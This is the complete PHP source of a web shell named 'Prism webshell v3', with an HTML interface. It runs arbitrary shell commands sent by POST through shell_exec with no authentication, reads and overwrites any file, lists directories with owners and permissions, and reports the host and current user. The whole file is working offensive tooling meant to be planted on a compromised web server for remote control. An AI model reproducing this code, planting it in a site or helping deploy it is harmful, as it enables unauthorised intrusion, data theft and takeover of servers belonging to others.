<?php
define('SCRIPT_NAME', 'Prism webshell v3');

$current_directory = getcwd();
$current_device = shell_exec('uname -a');
$current_user = shell_exec('whoami');
$command_output = '';
$file_content = '';
$openedFile = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	if (!empty($_POST['change_dir'])) {
		$target_dir = $_POST['change_dir'];
		if (is_dir($target_dir)) {
			chdir($target_dir);
			$current_directory = getcwd();
		} else {
			chdir(dirname($target_dir));
			$current_directory = getcwd();
            $file_content = file_get_contents($target_dir);
            $openedFile = true;
		}
	}
	
	if (!empty($_POST['update_file']) && isset($_POST['file_content'])) {
		file_put_contents($_POST['update_file'], $_POST['file_content']);
	}
	
	if (!empty($_POST['command'])) {
		$command_output = shell_exec("cd \"{$current_directory}\" && {$_POST['command']} 2>&1");
	}
}

if(isset($_COOKIE["cp_from"]) && isset($_COOKIE["cp_to"]) && !empty($command_output)){
	$command_output = iconv($_COOKIE["cp_from"], $_COOKIE["cp_to"], $command_output);
}

function getOwner($path){
    if(function_exists("posix_getpwuid"))
      return posix_getpwuid(fileowner($path))["name"];
    return fileowner($path);
}

function getDirectoryContents($dir) {
	$result = [];
	if (!is_dir($dir)) {
		return $result;
	}
	
	$items = scandir($dir);
	foreach ($items as $item) {
		//if ($item !== '.' && $item !== '..') {
		$path = $dir . DIRECTORY_SEPARATOR . $item;
		$stat = stat($path);
		
		if($item == ".") $item = "*THIS DIR*";
		
		$result[$item] = [
			'type' => is_dir($path) ? 'directory' : 'file',
			'permissions' => getUnixPermissions(fileperms($path)),
			'owner' => getOwner($path), //posix_getpwuid($stat['uid'])['name'],
			'size' => formatSize($stat['size']),
			'modified' => date("F d Y H:i:s", $stat['mtime']),
		];
		//}
	}
	return $result;
}

function getUnixPermissions($perms) {
	$info = ($perms & 0x4000) ? 'd' : '-'; // Directory or file
	$info .= (($perms & 0x0100) ? 'r' : '-'); // Owner read
	$info .= (($perms & 0x0080) ? 'w' : '-'); // Owner write
	$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : '-'); // Owner execute
	$info .= (($perms & 0x0020) ? 'r' : '-'); // Group read
	$info .= (($perms & 0x0010) ? 'w' : '-'); // Group write
	$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : '-'); // Group execute
	$info .= (($perms & 0x0004) ? 'r' : '-'); // Others read
	$info .= (($perms & 0x0002) ? 'w' : '-'); // Others write
	$info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : '-'); // Others execute
	return $info;
}

function formatSize($size) {
	if ($size >= 1048576) {
		return number_format($size / 1048576, 2) . ' MB';
	} elseif ($size >= 1024) {
		return number_format($size / 1024, 2) . ' KB';
	} else {
		return $size . ' bytes';
	}
}

$directory_contents = getDirectoryContents($current_directory);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title><?php echo htmlspecialchars(SCRIPT_NAME); ?></title>
<!--link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/JennyBlackburn/webshell/refs/heads/main/style.css"-->
<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/JennyBlackburn/webshell@main/style.css">
</head>
<body>
<h1><?php echo htmlspecialchars(SCRIPT_NAME); ?></h1>
<div>
<strong>Device:</strong> <?php echo nl2br(htmlspecialchars($current_device)); ?><br>
<strong>User:</strong> <?php echo htmlspecialchars($current_user); ?><br>
<strong>Current Directory:</strong> <code><?php echo $current_directory; ?></code>
</div>

<br>

<form method="post">
<!--input type="text" name="command" placeholder="Enter command" autofocus autocomplete="off"-->
<input type="text" name="command" id="commandInput" placeholder="Enter command" autofocus autocomplete="off" oninput="resizeInput(this)">
<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
<button type="submit">Execute</button>
</form>
<pre><?php echo htmlspecialchars($command_output); ?></pre>

<?php if ($openedFile): ?>
<h3>Editing: <?php echo htmlspecialchars($_POST['change_dir']); ?></h3>
<form method="post">
<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory); ?>">
<textarea name="file_content"><?php echo htmlspecialchars($file_content); ?></textarea><br>
<input type="hidden" name="update_file" value="<?php echo htmlspecialchars($_POST['change_dir']); ?>">
<button type="submit">Save Changes</button>
</form>
<?php endif; ?>

<h3>Directory Contents</h3>
<table id="directoryTable">
<thead>
<tr>
<th onclick="sortTable(0)">Permissions</th>
<th onclick="sortTable(1)">Name</th>
<th onclick="sortTable(2)">Type</th>
<th onclick="sortTable(3)">Size</th>
<th onclick="sortTable(4)">Owner</th>
<th onclick="sortTable(5)">Last Modified</th>
</tr>
</thead>
<tbody>
<?php foreach ($directory_contents as $name => $info): ?>
<tr>
<td><?php echo htmlspecialchars($info['permissions']); ?></td>
<td>
<form method="post" style="display:inline;" id="form-<?php echo htmlspecialchars($name); ?>">
<input type="hidden" name="change_dir" value="<?php echo htmlspecialchars($current_directory . '/' . $name); ?>">
<!--input type="submit" value="<?php echo htmlspecialchars($name); ?>" class="link-button"-->
<span class="link-text" onclick="document.getElementById('form-<?php echo htmlspecialchars($name); ?>').submit();">
<?php echo htmlspecialchars($name); ?>
</span>
</form>
</td>
<td><?php echo htmlspecialchars($info['type']); ?></td>
<td><?php echo htmlspecialchars($info['size']); ?></td>
<td><?php echo htmlspecialchars($info['owner']); ?></td>
<td><?php echo htmlspecialchars($info['modified']); ?></td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
<script>
function sortTable(n) {
  var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
  table = document.getElementById("directoryTable");
  switching = true;
  // Set the sorting direction to ascending:
  dir = "asc";
  /* Make a loop that will continue until
  no switching has been done: */
  while (switching) {
    // Start by saying: no switching is done:
    switching = false;
    rows = table.rows;
    /* Loop through all table rows (except the
    first, which contains table headers): */
    for (i = 1; i < (rows.length - 1); i++) {
      // Start by saying there should be no switching:
      shouldSwitch = false;
      /* Get the two elements you want to compare,
      one from current row and one from the next: */
      x = rows[i].getElementsByTagName("TD")[n];
      y = rows[i + 1].getElementsByTagName("TD")[n];
      /* Check if the two rows should switch place,
      based on the direction, asc or desc: */
      if (dir == "asc") {
        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
          // If so, mark as a switch and break the loop:
          shouldSwitch = true;
          break;
        }
      } else if (dir == "desc") {
        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
          // If so, mark as a switch and break the loop:
          shouldSwitch = true;
          break;
        }
      }
    }
    if (shouldSwitch) {
      /* If a switch has been marked, make the switch
      and mark that a switch has been done: */
      rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
      switching = true;
      // Each time a switch is done, increase this count by 1:
      switchcount ++;
    } else {
      /* If no switching has been done AND the direction is "asc",
      set the direction to "desc" and run the while loop again. */
      if (switchcount == 0 && dir == "asc") {
        dir = "desc";
        switching = true;
      }
    }
  }
}
function resizeInput(el) {
    // Set width to auto so it can resize dynamically
    el.style.width = 'auto';
    // Set width to the scrollWidth (total width of the content)
    el.style.width = (el.scrollWidth + 10) + 'px'; // Add a bit of padding
    const maxWidth = window.innerWidth * 0.8; // Set a max width (e.g., 80% of the screen width)
    if (el.scrollWidth > maxWidth) {
      el.style.width = maxWidth + 'px';
    }
  }
</script>
</body>
</html>
